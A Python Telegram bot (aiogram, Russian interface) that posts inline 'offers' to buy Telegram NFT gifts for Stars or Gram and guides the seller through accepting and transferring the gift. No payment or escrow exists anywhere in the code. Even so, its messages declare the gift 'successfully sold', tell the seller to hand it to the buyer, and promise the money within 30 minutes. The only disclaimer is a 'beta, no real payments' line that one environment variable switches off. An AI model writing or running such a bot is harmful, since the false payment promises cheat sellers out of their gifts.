import asyncio
import logging
import os
import re
import time
import uuid
from html import escape

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramBadRequest
from aiogram.filters import CommandStart
from aiogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    InlineQuery,
    InlineQueryResultArticle,
    InputTextMessageContent,
    Message,
)

logging.basicConfig(level=logging.INFO)

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
BETA = os.getenv("BETA", "1") == "1"  # показывать плашку "тестовая сделка"
BETA_LINE = "\n\n🧪 <i>Бета-тест: реальных оплат нет</i>" if BETA else ""

dp = Dispatcher()

# offer_id -> dict. Для беты хватает памяти; потом заменим на SQLite/Postgres.
OFFERS: dict[str, dict] = {}


# ---------- helpers ----------

def gift_title(url: str) -> str:
    """https://t.me/nft/MirageLamp-71292 -> Mirage Lamp #71292"""
    slug = url.rstrip("/").split("/")[-1]
    if "-" in slug:
        name, num = slug.rsplit("-", 1)
        name = re.sub(r"(?<=[a-z0-9])(?=[A-Z])", " ", name)
        return f"{name} #{num}"
    return slug


def money(o: dict) -> str:
    price = f"{o['price']:,}".replace(",", "") if o["currency"] == "stars" else f"{o['price']:,}"
    return f"{price} ⭐" if o["currency"] == "stars" else f"{price} Gram"


def cur_name(o: dict) -> str:
    return "Stars" if o["currency"] == "stars" else "Gram"


def user_link(uid: int, name: str) -> str:
    return f'<a href="tg://user?id={uid}">{escape(name)}</a>'


def gift_link(o: dict) -> str:
    return f'<a href="{escape(o["url"])}">{escape(o["title"])}</a>'


def time_left(o: dict) -> tuple[int, int]:
    rem = max(0, int(o["expires"] - time.time()))
    return rem // 3600, (rem % 3600) // 60


def parse_query(text: str) -> dict | None:
    """Формат: <цена> <ссылка на подарок> [минуты] [stars|gram]"""
    link = None
    nums: list[int] = []
    currency = "stars"
    for tok in text.split():
        low = tok.lower()
        if re.match(r"https?://t\.me/nft/\S+", tok):
            link = tok
        elif low in {"gram", "грам", "грамм", "ton", "тон"}:
            currency = "gram"
        elif low in {"stars", "star", "зв", "звезд", "звезды", "⭐"}:
            currency = "stars"
        elif re.fullmatch(r"\d[\d,_]*", tok):
            nums.append(int(re.sub(r"[,_]", "", tok)))
    if not link or not nums or nums[0] <= 0:
        return None
    minutes = nums[1] if len(nums) > 1 else 60
    minutes = max(1, min(minutes, 24 * 60))
    return {"url": link, "price": nums[0], "minutes": minutes, "currency": currency}


# ---------- texts & keyboards ----------

def show_btn(o: dict) -> InlineKeyboardButton:
    return InlineKeyboardButton(text="ПОКАЗАТЬ ПОДАРОК", url=o["url"])


def pending_view(o: dict):
    h, m = time_left(o)
    text = (
        f"🎁 Пользователь {user_link(o['buyer_id'], o['buyer_name'])} предлагает Вам "
        f"{money(o)} за подарок {gift_link(o)}.\n\n"
        f"⏱ Предложение действует ещё {h} ч. {m} мин."
        f"{BETA_LINE}"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [show_btn(o)],
        [
            InlineKeyboardButton(text="✅ Принять", callback_data=f"acc:{o['id']}"),
            InlineKeyboardButton(text="❌ Отклонить", callback_data=f"dec:{o['id']}"),
        ],
    ])
    return text, kb


def accepted_view(o: dict):
    text = (
        f"🎁 Подарок: {gift_link(o)} успешно продан!\n\n"
        f"• Передайте подарок покупателю для зачисления {cur_name(o)}."
        f"{BETA_LINE}"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [show_btn(o)],
        [InlineKeyboardButton(text="Передать", callback_data=f"tr:{o['id']}")],
    ])
    return text, kb


def transfer_view(o: dict):
    text = (
        f"📤 <b>Передача подарка</b>\n\n"
        f"Подарок: {gift_link(o)}\n"
        f"Покупатель: {user_link(o['buyer_id'], o['buyer_name'])}\n"
        f"Сумма: {money(o)}\n\n"
        f"Передайте подарок покупателю и подтвердите передачу."
        f"{BETA_LINE}"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📤 Передать покупателю", callback_data=f"ok:{o['id']}")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data=f"back:{o['id']}")],
    ])
    return text, kb


def done_view(o: dict):
    text = (
        f"✅ NFT {gift_link(o)} успешно передан!\n\n"
        f"Средства ({money(o)}) будут зачислены в течение 30 минут."
        f"{BETA_LINE}"
    )
    return text, InlineKeyboardMarkup(inline_keyboard=[[show_btn(o)]])


def declined_view(o: dict):
    text = f"🚫 Сделка отклонена.\n\nПодарок: {gift_link(o)}{BETA_LINE}"
    return text, None


def expired_view(o: dict):
    text = f"⌛ Срок предложения истёк.\n\nПодарок: {gift_link(o)}{BETA_LINE}"
    return text, None


async def render(cb: CallbackQuery, view):
    text, kb = view
    try:
        await cb.bot.edit_message_text(
            text=text,
            inline_message_id=cb.inline_message_id,
            reply_markup=kb,
        )
    except TelegramBadRequest as e:
        if "not modified" not in str(e):
            raise


# ---------- handlers ----------

@dp.message(CommandStart())
async def start(msg: Message):
    me = await msg.bot.get_me()
    await msg.answer(
        "👋 <b>Офер-бот</b> (бета)\n\n"
        "Чтобы кинуть оффер на подарок, в любом чате напиши:\n"
        f"<code>@{me.username} 1500 https://t.me/nft/MirageLamp-71292 60</code>\n\n"
        "• <b>1500</b> — цена\n"
        "• ссылка — подарок\n"
        "• <b>60</b> — время действия в минутах (по умолчанию 60)\n"
        "• добавь слово <code>gram</code>, если цена в Gram (по умолчанию ⭐ Stars)\n\n"
        "Дальше выбери результат — в чат уйдёт оффер с кнопками «Принять» / «Отклонить»."
    )


@dp.inline_query()
async def inline_handler(q: InlineQuery):
    me = await q.bot.get_me()
    data = parse_query(q.query)
    if not data:
        help_text = (
            "ℹ️ Формат:\n"
            f"<code>@{me.username} 1500 https://t.me/nft/MirageLamp-71292 60</code>"
        )
        await q.answer(
            [InlineQueryResultArticle(
                id="help",
                title="Как кинуть оффер",
                description="цена  ссылка на подарок  [минуты]  [gram]",
                input_message_content=InputTextMessageContent(message_text=help_text),
            )],
            cache_time=0, is_personal=True,
        )
        return

    # чистим старьё, чтобы память не росла
    if len(OFFERS) > 5000:
        now = time.time()
        for k in [k for k, v in OFFERS.items() if v["expires"] < now - 86400]:
            OFFERS.pop(k, None)

    o = {
        "id": uuid.uuid4().hex[:10],
        "buyer_id": q.from_user.id,
        "buyer_name": q.from_user.full_name,
        "url": data["url"],
        "title": gift_title(data["url"]),
        "price": data["price"],
        "currency": data["currency"],
        "expires": time.time() + data["minutes"] * 60,
        "status": "pending",
        "seller_id": None,
    }
    OFFERS[o["id"]] = o
    text, kb = pending_view(o)
    await q.answer(
        [InlineQueryResultArticle(
            id=o["id"],
            title=f"Предложить {money(o)} за {o['title']}",
            description=f"Действует {data['minutes']} мин.",
            input_message_content=InputTextMessageContent(message_text=text),
            reply_markup=kb,
        )],
        cache_time=0, is_personal=True,
    )


def get_offer(cb: CallbackQuery) -> dict | None:
    return OFFERS.get(cb.data.split(":", 1)[1])


@dp.callback_query(F.data.startswith("acc:"))
async def on_accept(cb: CallbackQuery):
    o = get_offer(cb)
    if not o:
        return await cb.answer("Оффер не найден (бот перезапускался).", show_alert=True)
    if o["status"] != "pending":
        return await cb.answer("Оффер уже обработан.")
    if o["expires"] <= time.time():
        o["status"] = "expired"
        await render(cb, expired_view(o))
        return await cb.answer("Срок истёк.")
    if cb.from_user.id == o["buyer_id"]:
        return await cb.answer("Нельзя принять собственный оффер.", show_alert=True)
    o["status"] = "accepted"
    o["seller_id"] = cb.from_user.id
    await render(cb, accepted_view(o))
    await cb.answer("Сделка принята!")


@dp.callback_query(F.data.startswith("dec:"))
async def on_decline(cb: CallbackQuery):
    o = get_offer(cb)
    if not o:
        return await cb.answer("Оффер не найден.", show_alert=True)
    if o["status"] != "pending":
        return await cb.answer("Оффер уже обработан.")
    o["status"] = "declined"
    await render(cb, declined_view(o))
    await cb.answer("Сделка отклонена.")


@dp.callback_query(F.data.startswith("tr:"))
async def on_transfer(cb: CallbackQuery):
    o = get_offer(cb)
    if not o or o["status"] != "accepted":
        return await cb.answer("Недоступно.", show_alert=True)
    if cb.from_user.id != o["seller_id"]:
        return await cb.answer("Передать подарок может только продавец.", show_alert=True)
    await render(cb, transfer_view(o))
    await cb.answer()


@dp.callback_query(F.data.startswith("back:"))
async def on_back(cb: CallbackQuery):
    o = get_offer(cb)
    if not o or o["status"] != "accepted" or cb.from_user.id != o["seller_id"]:
        return await cb.answer("Недоступно.", show_alert=True)
    await render(cb, accepted_view(o))
    await cb.answer()


@dp.callback_query(F.data.startswith("ok:"))
async def on_confirm(cb: CallbackQuery):
    o = get_offer(cb)
    if not o or o["status"] != "accepted":
        return await cb.answer("Недоступно.", show_alert=True)
    if cb.from_user.id != o["seller_id"]:
        return await cb.answer("Передать подарок может только продавец.", show_alert=True)
    o["status"] = "done"
    await render(cb, done_view(o))
    await cb.answer("Подарок передан!")


async def main():
    if not BOT_TOKEN:
        raise SystemExit("Задай переменную окружения BOT_TOKEN")
    bot = Bot(
        BOT_TOKEN,
        default=DefaultBotProperties(
            parse_mode=ParseMode.HTML,
            link_preview_is_disabled=True,
        ),
    )
    await dp.start_polling(
        bot, allowed_updates=["message", "inline_query", "callback_query"]
    )


if __name__ == "__main__":
    asyncio.run(main())
